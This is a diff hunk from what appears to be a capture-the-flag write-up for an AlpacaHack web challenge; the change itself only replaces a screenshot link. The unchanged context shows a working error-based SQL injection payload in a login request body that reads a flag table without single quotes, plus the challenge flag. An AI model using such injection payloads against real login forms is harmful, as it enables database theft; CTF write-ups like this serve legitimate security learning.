@@ -208,7 +208,7 @@ Content-Length: 78
 username=\&password=+and+updatexml(null,concat((select+*+from+flag)),null)--+-
 ```
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/AlpacaHack-Round-2-Web/images/Pasted%20image%2020240901172708.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/AlpacaHack-Round-2-Web/images/Pasted%20image%2020240901174212.png)
 
 - **Flag: `Alpaca{SQLi_with0ut_5ingle_quot3s!}`**
 
